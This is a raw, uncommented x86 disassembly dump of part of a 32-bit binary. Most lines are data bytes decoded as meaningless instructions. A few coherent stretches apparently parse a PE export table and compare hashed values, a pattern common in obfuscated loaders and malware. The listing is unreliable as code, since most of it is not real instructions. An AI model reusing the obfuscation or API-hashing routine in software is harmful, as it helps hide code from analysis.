  40bfe3:	mov    bl,0xa6
  40bfe5:	mov    al,BYTE PTR [ecx-0x27af37fb]
  40bfeb:	daa    
  40bfec:	and    al,0x8f
  40bfee:	ret    
  40bfef:	pop    ebp
  40bff0:	cwde   
  40bff1:	jg     0x40bfbb
  40bff3:	add    bh,BYTE PTR [ebx+0x7f]
  40bff6:	xor    al,0x19
  40bff8:	add    BYTE PTR [esi-0x4f],al
  40bffb:	retf   
  40bffc:	lock mov eax,ds:0xf9710ad5
  40c002:	add    cl,BYTE PTR [edx-0x5f]
  40c005:	add    al,0x3f
  40c007:	js     0x40c068
  40c009:	dec    esp
  40c00a:	inc    esp
  40c00b:	push   ss
  40c00c:	out    dx,eax
  40c00d:	add    eax,0x92003b1a
  40c012:	or     al,0xa0
  40c014:	inc    eax
  40c015:	inc    edx
  40c016:	mov    bh,0xe3
  40c018:	loop   0x40c017
  40c01a:	jge    0x40bfcd
  40c01c:	mov    dl,0xf5
  40c01e:	aas    
  40c01f:	mov    ah,BYTE PTR [eax]
  40c021:	push   ebp
  40c022:	cmp    edi,DWORD PTR [ebp+0x3c]
  40c025:	or     DWORD PTR [edi-0x2a],ecx
  40c028:	test   DWORD PTR [eax],edx
  40c02a:	push   edi
  40c02b:	xchg   edx,eax
  40c02c:	sbb    BYTE PTR [edx+0x2],0x78
  40c030:	push   ss
  40c031:	ja     0x40c06c
  40c033:	pop    es
  40c034:	(bad)  
  40c035:	jns    0x40c044
  40c037:	add    cl,BYTE PTR [ebp-0x24]
  40c03a:	(bad)  
  40c03b:	fwait
  40c03c:	and    eax,DWORD PTR [edi+0x664b08ba]
  40c042:	ror    DWORD PTR ss:[esi],1
  40c045:	xchg   ebx,eax
  40c046:	aas    
  40c047:	ficom  DWORD PTR ds:0x4d5d3f29
  40c04d:	lea    eax,[ebx]
  40c04f:	and    dh,BYTE PTR [ecx]
  40c051:	mov    dl,0xe0
  40c053:	jecxz  0x40c094
  40c055:	or     eax,0xc939271d
  40c05a:	xchg   edi,eax
  40c05b:	je     0x40c00d
  40c05d:	cmp    bl,BYTE PTR [esi-0x22]
  40c060:	lds    ebx,FWORD PTR [ebp-0x1]
  40c063:	mov    DWORD PTR [edx-0x45],ecx
  40c066:	cmp    cl,bl
  40c068:	into   
  40c069:	in     eax,0xc9
  40c06b:	fmul   QWORD PTR [eax]
  40c06d:	leave  
  40c06e:	sbb    edx,DWORD PTR [ecx+0x31]
  40c071:	mov    ecx,0x5c491d9
  40c076:	mov    ch,0xda
  40c078:	int3   
  40c079:	in     al,dx
  40c07a:	shl    BYTE PTR [esp+edi*1],0x6e
  40c07e:	sbb    al,0x55
  40c080:	dec    esi
  40c081:	pusha  
  40c082:	sbb    BYTE PTR [esi],ch
  40c084:	pop    esp
  40c085:	xor    al,BYTE PTR [ebx+0x37332d84]
  40c08b:	adc    dl,BYTE PTR [ebx]
  40c08d:	jo     0x40c033
  40c08f:	lahf   
  40c090:	or     esi,DWORD PTR [edi+0x40c4ba0f]
  40c096:	adc    BYTE PTR [ebx],al
  40c098:	dec    eax
  40c099:	and    BYTE PTR [ecx+0x430542],ah
  40c09f:	or     eax,DWORD PTR ds:0x42ee0c
  40c0a5:	mov    ds:0x430542,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43049e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e762
  40c0cb:	mov    ds:0x43049e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4304a6,0x0
  40c0dd:	mov    eax,ds:0x4304a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4304a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4304a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4304b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e776
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e8f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eaf4
  40c11d:	cmp    DWORD PTR ds:0x4304a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	add    edx,DWORD PTR [eax-0x2cd76e3]
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c0dc
  40c153:	mov    esi,0x745c0287
  40c158:	and    DWORD PTR [ecx+0x1634f423],0x9a43a2e5
  40c162:	int3   
  40c163:	mov    ds:0x3f840d8b,al
  40c168:	inc    eax
  40c169:	pop    ecx
  40c16a:	inc    edi
  40c16b:	fld    DWORD PTR [edi+edx*4]
  40c16e:	test   al,0x9b
  40c170:	(bad)  
  40c171:	jne    0x40c1c1
  40c173:	jmp    0x40c1f2
  40c175:	adc    eax,0xf5ea9a23
  40c17a:	sub    DWORD PTR [ebx-0xc039f3a],ebp
  40c180:	retf   
  40c181:	mov    edx,0xf02dad39
  40c186:	ret    0xef81
  40c189:	adc    bh,bl
  40c18b:	mov    al,ds:0x6fcf6899
  40c190:	xor    DWORD PTR [ebx],eax
  40c192:	mov    esi,0xa39aef22
  40c197:	jmp    DWORD PTR [ecx-0x17cad7ef]
  40c19d:	mov    ah,0xd1
  40c19f:	cmp    al,0x4b
  40c1a1:	push   ebp
  40c1a2:	cmp    ah,BYTE PTR [esi+0x11]
  40c1a5:	movaps xmm0,XMMWORD PTR [esi-0x1f897b9e]
  40c1ac:	int    0x61
  40c1ae:	push   ebp
  40c1af:	ror    ebp,0xd1
  40c1b2:	(bad)  
  40c1b3:	sbb    eax,DWORD PTR [edi+0x25]
  40c1b6:	pop    ss
  40c1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1b8:	jo     0x40c1f6
  40c1ba:	mov    ah,al
  40c1bc:	mov    DWORD PTR [ecx+ebx*4-0x4f],ebp
  40c1c0:	sbb    bh,BYTE PTR [ebp-0x43589eeb]
  40c1c6:	outs   dx,DWORD PTR ds:[esi]
  40c1c7:	mov    ebp,0x107d1292
  40c1cc:	mov    eax,0x2c1c931d
  40c1d1:	enter  0xba69,0xec
  40c1d5:	mov    bl,0xab
  40c1d7:	mov    WORD PTR [ecx],cs
  40c1d9:	add    dl,BYTE PTR [ebx-0x5fe3c388]
  40c1df:	sti    
  40c1e0:	push   ecx
  40c1e1:	jae    0x40c208
  40c1e3:	and    bh,BYTE PTR cs:[edx+0x55]
  40c1e7:	lods   al,BYTE PTR ds:[esi]
  40c1e8:	test   bl,cl
  40c1ea:	int    0x7f
  40c1ec:	retf   
  40c1ed:	jne    0x40c1aa
  40c1ef:	test   DWORD PTR [eax],edx
  40c1f1:	xchg   edi,eax
  40c1f2:	lods   al,BYTE PTR ds:[esi]
  40c1f3:	fwait
  40c1f4:	and    eax,DWORD PTR [eax+0x4b]
  40c1f7:	mov    dh,0xbb
  40c1f9:	gs shr ch,1
  40c1fc:	popa   
  40c1fd:	out    0x8c,al
  40c1ff:	js     0x40c225
  40c201:	or     dh,BYTE PTR [edx+0x30]
  40c204:	outs   dx,BYTE PTR ds:[esi]
  40c205:	ja     0x40c261
  40c207:	inc    ebx
  40c208:	fsub   DWORD PTR [ebp+0x1821ca0f]
  40c20e:	push   edi
  40c20f:	hlt    
  40c210:	mov    BYTE PTR [ecx+0x7dd606e3],al
  40c216:	push   cs
  40c217:	add    BYTE PTR [edx-0x7312a68e],dh
  40c21d:	call   0x7b86164
  40c222:	into   
  40c223:	ins    DWORD PTR es:[edi],dx
  40c224:	shr    DWORD PTR [ebp-0x73834c3f],cl
  40c22a:	cmp    dl,BYTE PTR [eax]
  40c22c:	sti    
  40c22d:	pusha  
  40c22e:	jbe    0x40c27c
  40c230:	cmp    eax,DWORD PTR [eax+0x28]
  40c233:	add    esp,DWORD PTR [ebx+0x3f]
  40c236:	lahf   
  40c237:	(bad)  
  40c238:	aad    0xac
  40c23a:	les    ecx,FWORD PTR [edi]
  40c23c:	add    ah,al
  40c23e:	push   eax
  40c23f:	scas   eax,DWORD PTR es:[edi]
  40c240:	sub    al,0x9c
  40c242:	daa    
  40c243:	rcr    BYTE PTR [esi+0x7ea8b367],1
  40c249:	mov    ch,0x3b
  40c24b:	les    eax,FWORD PTR [edx-0x1a]
  40c24e:	mov    al,0xfe
  40c250:	cdq    
  40c251:	jnp    0x40c2b9
  40c253:	sar    BYTE PTR [ebx+0x499a533b],cl
  40c259:	dec    eax
  40c25a:	daa    
  40c25b:	sub    BYTE PTR [ecx-0x2b],dl
  40c25e:	mov    ds:0x7a5f0ccf,eax
  40c263:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c265:	ror    BYTE PTR [edx+ebp*2],cl
  40c268:	dec    esp
  40c269:	xor    al,0x6b
  40c26b:	or     DWORD PTR [eax+0x32],0x3f
  40c26f:	cmp    bh,BYTE PTR [edi+0x14]
  40c272:	test   eax,0xeca629fe
  40c277:	or     ebp,DWORD PTR [eax+0x39065569]
  40c27d:	call   FWORD PTR [ebx-0x23b5846]
  40c283:	fwait
  40c284:	xor    eax,0x8ea842f
  40c289:	xchg   ecx,eax
  40c28a:	stos   DWORD PTR es:[edi],eax
  40c28b:	jns    0x40c248
  40c28d:	inc    esi
  40c28e:	sub    ecx,DWORD PTR [edx-0x764341aa]
  40c294:	dec    ebp
  40c295:	in     al,dx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0xd5e92bcc,0xf3b45e3a
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c266
  40c2bd:	inc    ebp
  40c2be:	bound  ebx,QWORD PTR [edi-0x26]
  40c2c1:	or     bh,BYTE PTR [eax-0x7bea174d]
  40c2c7:	retf   0x7c70
  40c2ca:	pop    ecx
  40c2cb:	enter  0x27c1,0x28
  40c2cf:	cmc    
  40c2d0:	cmp    edx,esp
  40c2d2:	inc    ebp
  40c2d3:	out    0x24,eax
  40c2d5:	cmp    eax,0x1d5f3c80
  40c2da:	std    
  40c2db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2dc:	call   0xa773522f
  40c2e1:	adc    ebp,DWORD PTR [esi+0x25]
  40c2e4:	jl     0x40c359
  40c2e6:	pop    ebx
  40c2e7:	and    DWORD PTR [ebp-0x77],eax
  40c2ea:	fdivr  DWORD PTR [ecx-0x458aa9f6]
  40c2f0:	and    DWORD PTR [edi-0x3],edx
  40c2f3:	cli    
  40c2f4:	adc    eax,0x8611fa92
  40c2f9:	shr    BYTE PTR [ebx],cl
  40c2fb:	push   ebx
  40c2fc:	(bad)  
  40c2fd:	loop   0x40c2cc
  40c2ff:	jbe    0x40c2fa
  40c301:	sti    
  40c302:	cmp    BYTE PTR [ecx+0x451c9ed2],cl
  40c308:	shl    BYTE PTR [ebx-0x72c93ab7],cl
  40c30e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c30f:	or     BYTE PTR [esi],0xa5
  40c312:	push   0x46
  40c314:	sbb    ebp,DWORD PTR [ebx-0x274ce6c]
  40c31a:	fisttp QWORD PTR [edi]
  40c31c:	outs   dx,DWORD PTR ds:[esi]
  40c31d:	in     al,0x5a
  40c31f:	push   esi
  40c320:	xchg   ecx,eax
  40c321:	pop    ss
  40c322:	sti    
  40c323:	sbb    edi,DWORD PTR [edi+0x11f51652]
  40c329:	xor    eax,0x294a8d7f
  40c32e:	cmp    ah,BYTE PTR [ebp-0x27]
  40c331:	dec    ecx
  40c332:	cmp    eax,0x84b33f9e
  40c337:	cmc    
  40c338:	nop
  40c339:	mov    dh,0xe2
  40c33b:	ss push 0xddb41b0f
  40c341:	stc    
  40c342:	(bad)  
  40c343:	fdivr  QWORD PTR [ebx]
  40c345:	fsub   st,st(0)
  40c347:	nop
  40c348:	jecxz  0x40c2d7
  40c34a:	xbegin 0xf6eafb22
  40c350:	pushf  
  40c351:	clc    
  40c352:	stos   DWORD PTR es:[edi],eax
  40c353:	pop    edi
  40c354:	fidivr WORD PTR [ebx-0x6b]
  40c357:	arpl   WORD PTR [edx],bx
  40c359:	ficomp WORD PTR [edx-0x4c7bd858]
  40c35f:	jmp    0x40c353
  40c361:	lahf   
  40c362:	adc    DWORD PTR [ebx+eiz*1-0x63df6c64],ebx
  40c369:	int3   
  40c36a:	adc    eax,0x1514494
  40c36f:	jnp    0x40c3e9
  40c371:	sbb    esi,DWORD PTR [ebx]
  40c373:	sub    edi,DWORD PTR [edi-0x66a6d5bb]
  40c379:	inc    ecx
  40c37a:	mov    ecx,0xdb16533c
  40c37f:	xchg   BYTE PTR [ebx+0x76],ah
  40c382:	jmp    0x7aea:0x165db60d
  40c389:	cli    
  40c38a:	test   al,0x74
  40c38c:	dec    ecx
  40c38d:	sbb    DWORD PTR [eax+0x45],eax
  40c390:	jbe    0x40c317
  40c392:	fwait
  40c393:	in     al,0x63
  40c395:	(bad)  
  40c397:	cld    
  40c398:	int3   
  40c399:	add    ecx,ebp
  40c39b:	add    eax,0x297edfa6
  40c3a0:	lods   al,BYTE PTR ds:[esi]
  40c3a1:	jl     0x40c3e1
  40c3a3:	sbb    al,0x56
  40c3a5:	adc    BYTE PTR [edx-0x48bb0b5d],bh
  40c3ab:	arpl   bp,bx
  40c3ad:	stos   DWORD PTR es:[edi],eax
  40c3ae:	jne    0x40c3b2
  40c3b0:	adc    BYTE PTR [eax+0xe9b91ab],cl
  40c3b6:	push   esp
  40c3b7:	mov    cl,dh
  40c3b9:	push   esi
  40c3ba:	mov    esi,cs
  40c3bc:	and    dh,BYTE PTR [edx+0x3e]
  40c3bf:	lea    esi,[ecx]
  40c3c1:	lahf   
  40c3c2:	sbb    dl,BYTE PTR [ebx]
  40c3c4:	fsub   QWORD PTR [ebx+0x7ee853b4]
  40c3ca:	push   ebx
  40c3cb:	iret   
  40c3cc:	xor    DWORD PTR [ebp+0x7e],eax
  40c3cf:	xor    bl,BYTE PTR [edi-0x6b9d735c]
  40c3d5:	xor    BYTE PTR [ebx+eiz*4-0x9ca1285],ch
  40c3dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3dd:	mov    cl,0x7
  40c3df:	push   ecx
  40c3e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e1:	adc    DWORD PTR [ecx-0x79],esi
  40c3e4:	mov    ebp,0xb7af1b23
  40c3e9:	int    0x28
  40c3eb:	pop    ds
  40c3ec:	retf   0x93fe
  40c3ef:	int3   
  40c3f0:	hlt    
  40c3f1:	out    0x16,eax
  40c3f3:	push   ebx
  40c3f4:	cmp    al,0xda
  40c3f6:	cmc    
  40c3f7:	mov    bl,0x84
  40c3f9:	ins    BYTE PTR es:[edi],dx
  40c3fa:	push   eax
  40c3fb:	dec    eax
  40c3fc:	loop   0x40c38b
  40c3fe:	inc    ebp
  40c3ff:	clc    
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	mov    DWORD PTR [ebp-0x4b7fa2],ebp
  40c417:	jle    0x40c497
  40c419:	aas    
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c450
  40c41e:	ds fcomp st(5)
  40c421:	enter  0x3126,0xb2
  40c425:	das    
  40c426:	aaa    
  40c427:	mov    esi,0x85e31848
  40c42c:	and    BYTE PTR [esi+0x6e],0x4e
  40c430:	fnstsw WORD PTR [ebp-0x66]
  40c433:	ja     0x40c3dc
  40c435:	push   es
  40c436:	cmp    edx,esi
  40c438:	xor    esi,DWORD PTR [edx]
  40c43a:	cwde   
  40c43b:	outs   dx,BYTE PTR ds:[esi]
  40c43c:	mov    DWORD PTR [ecx-0x76],edi
  40c43f:	pusha  
  40c440:	pusha  
  40c441:	sub    al,0x60
  40c443:	and    al,0x3b
  40c445:	popa   
  40c446:	jb     0x40c42e
  40c448:	rcl    BYTE PTR [ebx+0x55b11ab3],0xbf
  40c44f:	xchg   esp,eax
  40c450:	cmp    DWORD PTR [ebx+eax*1-0x753f70c1],eax
  40c457:	jge    0x40c471
  40c459:	push   ds
  40c45a:	fsub   DWORD PTR [ebx-0xfc96705]
  40c460:	add    bh,BYTE PTR [ebx+0x10]
  40c463:	jae    0x40c472
  40c465:	je     0x40c4b7
  40c467:	pop    es
  40c468:	push   es
  40c469:	pop    edx
  40c46a:	or     BYTE PTR [ebp+0x768baffa],al
  40c470:	fidiv  WORD PTR [edx-0x2c]
  40c473:	rcr    DWORD PTR [esi+0x349c7ce4],cl
  40c479:	pushf  
  40c47a:	mov    ds:0x3d1a9cea,eax
  40c47f:	es test al,0x6f
  40c482:	pushf  
  40c483:	bnd jo 0x40c4c5
  40c486:	add    edx,DWORD PTR [eax]
  40c488:	jle    0x40c4b3
  40c48a:	popa   
  40c48b:	xchg   edi,eax
  40c48c:	xchg   ecx,eax
  40c48d:	pusha  
  40c48e:	imul   ebx,ebx,0x896b5767
  40c494:	imul   eax,DWORD PTR [eax+0x63],0x79
  40c498:	dec    edi
  40c499:	(bad)  
  40c49a:	mov    ds:0x3cf2a324,eax
  40c49f:	je     0x40c4c6
  40c4a1:	pop    esi
  40c4a2:	daa    
  40c4a3:	dec    ebx
  40c4a4:	add    DWORD PTR [ebx-0x24],esi
  40c4a7:	les    esp,FWORD PTR [ebx-0x71adec3e]
  40c4ad:	push   ds
  40c4ae:	add    eax,0x23a47a4c
  40c4b3:	cmp    ebp,esi
  40c4b5:	outs   dx,BYTE PTR ds:[esi]
  40c4b6:	push   ebx
  40c4b7:	ins    BYTE PTR es:[edi],dx
  40c4b8:	das    
  40c4b9:	lods   al,BYTE PTR ds:[esi]
  40c4ba:	xchg   DWORD PTR [esi+0x385fa75a],edx
  40c4c0:	add    al,0x41
  40c4c2:	shl    BYTE PTR [esi-0x74],0x2
  40c4c6:	mov    BYTE PTR [esi+0x71],dh
  40c4c9:	mov    esi,0xef8bfa1d
  40c4ce:	or     al,0x45
  40c4d0:	push   esi
  40c4d1:	addr16 xchg esp,eax
  40c4d3:	dec    ecx
  40c4d4:	adc    BYTE PTR [ebx+edx*4+0x467e166b],bl
  40c4db:	(bad)  
  40c4dc:	mov    bl,0x51
  40c4de:	out    0xdd,al
  40c4e0:	add    ebp,DWORD PTR [ebp-0x1f]
  40c4e3:	repnz inc esp
  40c4e5:	mov    ah,0x71
  40c4e7:	dec    edx
  40c4e8:	aas    
  40c4e9:	lahf   
  40c4ea:	pop    eax
  40c4eb:	adc    ebp,esp
  40c4ed:	mov    DWORD PTR [ebx+0x2a],eax
  40c4f0:	(bad)  
  40c4f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4f2:	shr    DWORD PTR [eax+0x11],0xe
  40c4f6:	add    eax,0xd9f473b0
  40c4fb:	xor    ch,BYTE PTR [edx-0x325fb99a]
  40c501:	xchg   BYTE PTR [ebx-0x56],cl
  40c504:	ds jo  0x40c513
  40c507:	sti    
  40c508:	adc    al,0xdb
  40c50a:	xchg   ebp,eax
  40c50b:	mov    al,dh
  40c50d:	cdq    
  40c50e:	ss in  eax,0xe
  40c511:	call   0x3f0f:0x8c317eef
  40c518:	ss xchg BYTE PTR ss:[edx],bh
  40c51c:	xor    al,0x9d
  40c51e:	int3   
  40c51f:	ins    BYTE PTR es:[edi],dx
  40c520:	scas   al,BYTE PTR es:[edi]
  40c521:	cmp    al,0xa1
  40c523:	pop    ebp
  40c524:	mov    ds:0xe8114b20,eax
  40c529:	mov    fs,WORD PTR [ecx]
  40c52b:	ret    0xfc1e
  40c52e:	int3   
  40c52f:	or     esi,ecx
  40c531:	in     eax,0xe4
  40c533:	bound  eax,QWORD PTR [esi+0x7f]
  40c536:	iret   
  40c537:	sub    al,0x25
  40c539:	(bad)  
  40c53a:	push   0x48771f48
  40c53f:	dec    edx
  40c540:	add    BYTE PTR [edi],cl
  40c542:	in     eax,dx
  40c543:	mov    DWORD PTR [ecx-0x47ee674f],edi
  40c549:	xchg   ecx,eax
  40c54a:	mov    ah,0xda
  40c54c:	or     al,BYTE PTR [ecx+0x16]
  40c54f:	aas    
  40c550:	push   0x39
  40c552:	lods   eax,DWORD PTR ds:[esi]
  40c553:	repnz outs dx,DWORD PTR ds:[esi]
  40c555:	or     DWORD PTR ds:0xe57e606c,0x7b
  40c55c:	mov    eax,0xd04d894e
  40c561:	push   eax
  40c562:	push   DWORD PTR [ebp-0x30]
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x93e2679c
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c5b6
  40c58e:	iret   
  40c58f:	xchg   esp,eax
  40c590:	rcr    eax,1
  40c592:	push   esp
  40c593:	out    dx,eax
  40c594:	cwde   
  40c595:	mov    edi,0x1c347ea3
  40c59a:	and    ebx,DWORD PTR [ecx]
  40c59c:	mov    al,0xc2
  40c59e:	test   eax,0x499ff4c6
  40c5a3:	ins    DWORD PTR es:[edi],dx
  40c5a4:	imul   esp,DWORD PTR [edx+0x6b121b9],0x2cbc9bb0
  40c5ae:	cmc    
  40c5af:	jmp    0x40c59e
  40c5b1:	idiv   BYTE PTR [edx+eax*8]
  40c5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5b5:	jb     0x40c635
  40c5b7:	push   esp
  40c5b8:	jbe    0x40c5e7
  40c5ba:	cmc    
  40c5bb:	dec    ebx
  40c5bc:	mov    al,ds:0x34e2ad0f
  40c5c1:	adc    dh,BYTE PTR [ebp-0x1]
  40c5c4:	pop    ebp
  40c5c5:	nop
  40c5c6:	adc    esi,DWORD PTR [eax]
  40c5c8:	sub    al,0x81
  40c5ca:	mov    bl,0xa1
  40c5cc:	pop    eax
  40c5cd:	xchg   edx,eax
  40c5ce:	icebp  
  40c5cf:	ret    0x282f
  40c5d2:	pop    esp
  40c5d3:	(bad)  
  40c5d5:	mov    esp,0x3e324f34
  40c5da:	das    
  40c5db:	mov    dh,0x9e
  40c5dd:	push   ecx
  40c5de:	push   0xffffff99
  40c5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5e1:	(bad)  
  40c5e3:	dec    edx
  40c5e4:	pop    ecx
  40c5e5:	loop   0x40c56e
  40c5e7:	pop    ss
  40c5e8:	push   0xa898185d
  40c5ed:	inc    esp
  40c5ee:	mov    ecx,0xdf475ce6
  40c5f3:	fbstp  TBYTE PTR [eax-0x48]
  40c5f6:	push   0x11
  40c5f8:	ja     0x40c5c9
  40c5fa:	mov    ebp,0x673d22d1
  40c5ff:	lahf   
  40c600:	cli    
  40c601:	push   es
  40c602:	sti    
  40c603:	sahf   
  40c604:	push   esp
  40c605:	fcmovb st,st(7)
  40c607:	adc    ebp,edi
  40c609:	jecxz  0x40c5f3
  40c60b:	add    cl,BYTE PTR [ebp-0x74]
  40c60e:	sahf   
  40c60f:	dec    esi
  40c610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c611:	add    eax,0x6e2d1b98
  40c616:	enter  0x78a2,0xf0
  40c61a:	mov    esi,0xda34019c
  40c61f:	aas    
  40c620:	add    cl,ah
  40c622:	jbe    0x40c632
  40c624:	mov    dl,BYTE PTR [edx]
  40c626:	dec    ecx
  40c627:	mov    ecx,edi
  40c629:	pusha  
  40c62a:	push   esp
  40c62b:	and    ebp,DWORD PTR [eax]
  40c62d:	aaa    
  40c62e:	cmp    dh,ah
  40c630:	sub    DWORD PTR [esi+0x57],ebx
  40c633:	lahf   
  40c634:	push   ebx
  40c635:	js     0x40c603
  40c637:	in     al,0xe0
  40c639:	repnz push esi
  40c63b:	push   ecx
  40c63c:	test   DWORD PTR [eax],edx
  40c63e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c63f:	je     0x40c5ea
  40c641:	lock pop edx
  40c643:	(bad)  
  40c644:	or     BYTE PTR [eax+0x54a9d95f],bl
  40c64a:	enter  0xc263,0xd2
  40c64e:	mov    ecx,0x128b16e3
  40c653:	cmp    ebp,esp
  40c655:	dec    edx
  40c656:	mov    ch,0x78
  40c658:	test   BYTE PTR [eax+ebp*4-0x2e],bl
  40c65c:	rol    BYTE PTR [ebp+0x2d10959d],1
  40c662:	mov    cl,0x4f
  40c664:	repnz pusha 
  40c666:	scas   al,BYTE PTR es:[edi]
  40c667:	jae    0x40c618
  40c669:	lods   eax,DWORD PTR ds:[esi]
  40c66a:	sbb    al,0x96
  40c66c:	daa    
  40c66d:	xchg   esi,eax
  40c66e:	lock add eax,0xcdb2a4d3
  40c674:	fisttp QWORD PTR [ecx+0x4a747f68]
  40c67a:	jmp    0xee051014
  40c67f:	(bad)  
  40c680:	sbb    eax,0x4b5d6652
  40c685:	ins    BYTE PTR es:[edi],dx
  40c686:	ins    BYTE PTR es:[edi],dx
  40c687:	test   edx,edx
  40c689:	std    
  40c68a:	adc    eax,0x382a8fad
  40c68f:	cmp    ebp,DWORD PTR ds:0x1941dc8b
  40c695:	sub    BYTE PTR [ebp-0x32da9df2],al
  40c69b:	daa    
  40c69c:	xor    BYTE PTR [ebp-0xf],al
  40c69f:	or     dh,BYTE PTR [edi+0x1a]
  40c6a2:	pop    ss
  40c6a3:	les    ecx,FWORD PTR [ecx+0x66]
  40c6a6:	mov    BYTE PTR [esi+edx*2+0x74d98b7f],dh
  40c6ad:	stc    
  40c6ae:	adc    al,ch
  40c6b0:	int3   
  40c6b1:	aad    0x1e
  40c6b3:	push   0x65
  40c6b5:	mov    eax,ds:0xf74d6573
  40c6ba:	sub    al,0xc2
  40c6bc:	loope  0x40c6a5
  40c6be:	cwde   
  40c6bf:	mov    es,WORD PTR [edi]
  40c6c1:	and    esi,DWORD PTR [edi-0x3e]
  40c6c4:	push   0x17
  40c6c6:	popa   
  40c6c7:	adc    dl,BYTE PTR [ebx-0x6f]
  40c6ca:	loopne 0x40c663
  40c6cc:	pop    ecx
  40c6cd:	dec    esi
  40c6ce:	mov    ecx,DWORD PTR [ebp-0x8]
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	shl    BYTE PTR [esi-0xf],cl
  40c743:	jb     0x40c77b
  40c745:	bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c72e
  40c74d:	push   esp
  40c74e:	jmp    0x40c6db
  40c750:	lea    edi,[ebx+edx*4]
  40c753:	inc    eax
  40c754:	les    eax,FWORD PTR [ecx-0x3d]
  40c757:	aam    0x5e
  40c759:	mov    DWORD PTR [edi-0x60efbc9f],edx
  40c75f:	push   edx
  40c760:	aaa    
  40c761:	xchg   ebx,eax
  40c762:	in     al,dx
  40c763:	sbb    edi,DWORD PTR [ebp-0x430a831a]
  40c769:	(bad)
  40c76c:	pop    ecx
  40c76d:	call   0x9983d3c6
  40c772:	adc    cl,BYTE PTR [edi-0x3a95b03b]
